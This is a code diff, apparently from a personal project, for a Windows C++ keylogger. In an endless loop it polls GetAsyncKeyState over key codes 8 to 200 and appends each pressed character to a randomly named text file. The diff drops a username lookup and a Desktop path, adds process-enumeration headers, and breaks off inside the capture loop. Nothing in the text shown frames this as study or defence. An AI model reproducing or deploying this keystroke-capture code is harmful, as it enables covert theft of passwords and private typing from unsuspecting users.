@@ -4,6 +4,8 @@
 #include <string>
 #include <cstdio>
 #include <Lmcons.h>
+#include <vector>
+#include <tlhelp32.h>
 
 using namespace std;
 const int MAX = 26;
@@ -15,18 +17,13 @@ string getString(char x)
     return s;
 }
 
+
 int writeCharToFile(string fileName, string x)
 {
     ofstream myfile;
     myfile.open(fileName, ios_base::app);
     myfile << x;
     return 0;
-}
-
-void getUsername(){
-    TCHAR username[UNLEN + 1];
-    DWORD size = UNLEN + 1;
-    cout << GetUserName((TCHAR *)username, &size);
 }
 
 string generateFileName(int n)
@@ -40,21 +37,22 @@ string generateFileName(int n)
     for (int i = 0; i < n; i++)
         res = res + alphabet[rand() % MAX];
 
-    return "~/Desktop/" + res + ".txt";
+    return res + ".txt";
 }
 
 int main()
 {
     short character;
     string fileName = generateFileName(10);
-    getUsername(); 
-    //sleep(100); 
     while (1)
     {
         for (character = 8; character <= 200; character++)
         {
+
             if (GetAsyncKeyState(character) == -32767)
             {
+
+
                 if ((character >= 39) && (character <= 64))
                 {
                     writeCharToFile(fileName, getString(character));
